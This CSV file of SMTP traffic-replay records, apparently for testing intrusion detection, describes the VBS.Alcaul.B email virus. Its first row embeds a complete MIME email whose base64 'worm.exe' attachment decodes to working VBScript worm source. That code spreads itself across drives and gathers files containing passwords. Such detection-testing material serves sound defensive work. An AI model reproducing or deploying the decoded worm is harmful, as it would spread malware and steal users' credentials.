XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_113511032673940""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 20:25:26 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_113511032673940[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_113511032673940[[0A ]]Content-Disposition: attachment; filename=""worm.exe""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.exe""[[0A 0A ]]b24gZXJyb3IgcmVzdW1lIG5leHQNCnJhbmRvbWl6ZSANCmtleSA9IGludCgo[[0A ]]cm5kKCkgKiAxMCkgKyAxNikNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNj[[0A ]]cmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCnNldCBhID0gZnNvLk9wZW5U[[0A ]]ZXh0RmlsZShXc2NyaXB0LlNjcmlwdEZ1bGxuYW1lLCAxKQ0KYWEgPSBhLnJl[[0A ]]YWRsaW5lDQpkZGQgPSBhLnJlYWRsaW5lDQpiID0gYS5yZWFkYWxsDQpGb3Ig[[0A ]]byA9IDEgdG8gTGVuKGIpDQpYID0gWCAmIEhleChBc2MoTWlkKGIsIG8sIDEp[[0A ]]KSB4b3Iga2V5KQ0KTmV4dA0KRm9yIHkgPSAyIHRvIExlbihhYSkgU3RlcCAy[[0A ]]DQp6eiA9IHp6ICYgQ2hyKCgiJmgiICsgTWlkKGFhLCB5LCAyKSkgeG9yIGtl[[0A ]]eTEpDQpuZXh0DQpzZXQgYSA9IGZzby5DcmVhdGVUZXh0RmlsZShXc2NyaXB0[[0A ]]LlNjcmlwdEZ1bGxuYW1lLCB0cnVlKQ0KYS5Xcml0ZWxpbmUgIiciICYgWA0K[[0A ]]YS5Xcml0ZWxpbmUgImtleTEgPSAiICYga2V5DQphLndyaXRlIHp6DQphLkNs[[0A ]]b3NlDQpmc28uZGVsZXRlZmlsZSgiYzpccGFzcy5vbiIpDQpzZXQgYWcgPSBm[[0A ]]c28uQ3JlYXRlVGV4dEZpbGUoImM6XHBhc3Mub24iLCB0cnVlKQ0KYWcud3Jp[[0A ]]dGVsaW5lICIuLi4iDQphZy5jbG9zZQ0KaHVodSgpDQpTdWIgaHVodSgpDQpP[[0A ]]biBFcnJvciBSZXN1bWUgTmV4dA0KZGltIGYsZjEsZmMNClNldCBmc28gPSBD[[0A ]]cmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNClNl[[0A ]]dCBkciA9IGZzby5Ecml2ZXMNCkZvciBFYWNoIGQgaW4gZHINCklmIGQuRHJp[[0A ]]dmVUeXBlPTIgb3IgZC5Ecml2ZVR5cGU9MyBUaGVuDQpzenQoZC5wYXRoJiJc[[0A ]]IikNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0KU3ViIHN6dChlcikNCk9uIEVy[[0A ]]cm9yIFJlc3VtZSBOZXh0DQpTZXQgc2Y9Q3JlYXRlT2JqZWN0KCJTY3JpcHRp[[0A ]]bmcuRmlsZVN5c3RlbU9iamVjdCIpDQpTZXQgZiA9IHNmLkdldEZvbGRlcihl[[0A ]]cikNClNldCBzZiA9IGYuU3ViRm9sZGVycw0KRm9yIEVhY2ggZjEgaW4gc2YN[[0A ]]Cnl5eXkoZjEucGF0aCkNCnN6dChmMS5wYXRoKQ0KTmV4dA0KRW5kIFN1Yg0K[[0A ]]U3ViIHl5eXkodXUpDQpPbiBFcnJvciBSZXN1bWUgTmV4dA0KU2V0IHNmPUNy[[0A ]]ZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KU2V0[[0A ]]IGYgPSBzZi5HZXRGb2xkZXIodXUpDQpTZXQgZmMgPSBmLkZpbGVzDQpGb3Ig[[0A ]]RWFjaCBmMSBpbiBmYw0KZXh0ID0gc2YuR2V0RXh0ZW5zaW9uTmFtZShmMS5w[[0A ]]YXRoKQ0KZXh0ID0gbGNhc2UoZXh0KQ0KaWYgKGV4dD0idmJzIikgb3IgKGV4[[0A ]]dD0idmJlIikgVGhlbg0Kc2V0IGRkZCA9IHNmLmdldGZpbGUod3NjcmlwdC5z[[0A ]]Y3JpcHRmdWxsbmFtZSkNCmRkZC5jb3B5KGYxLnBhdGgpDQplbmQgaWYNCmlm[[0A ]]IChleHQ9InR4dCIpIHRoZW4NClNldCBjb3Q9c2YuT3BlblRleHRGaWxlKGYx[[0A ]]LnBhdGgsIDEsIEZhbHNlKQ0KaGhoID0gY290LnJlYWRhbGwNCklmIEluU3Ry[[0A ]]KDEsIGhoaCwgInBhc3N3b3JkIikgVGhlbg0Kc2V0IGFnZSA9IHNmLm9wZW50[[0A ]]ZXh0ZmlsZSgiYzpccGFzcy5vbiIsIDgpDQphZ2Uud3JpdGVsaW5lIGhoaA0K[[0A ]]YWdlLmNsb3NlDQplbmQgaWYNCmVuZCBpZg0KbmV4dA0KZW5kIHN1Yg0KJ3Zi[[0A ]]cy5qYW5pcyBieSBhbGNvcGF1bC9bclJsZl0NCidtYXkgMDIsIDIwMDINCidh[[0A ]]IGZyaWVuZCB3aXRoIHdlZWQgaXMgYSBmcmllbmQgaW5kZWVkLi4=[[0A 0A ]]--_----------=_113511032673940--[[0A 0A 0A 0A]]"
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,[[0D 0A ]].[[0D 0A]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,QUIT[[0D 0A]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b 0d 0a]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 Accepted[[0d 0a]]
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.Alcaul.B.51f19993.xml,Email Virus VBS.Alcaul.B,This is the email virus VBS.Alcaul.B as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 51f19993474bc77d0cb4694bc6c8f643.  This attack is delivered via SMTP to a email server.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
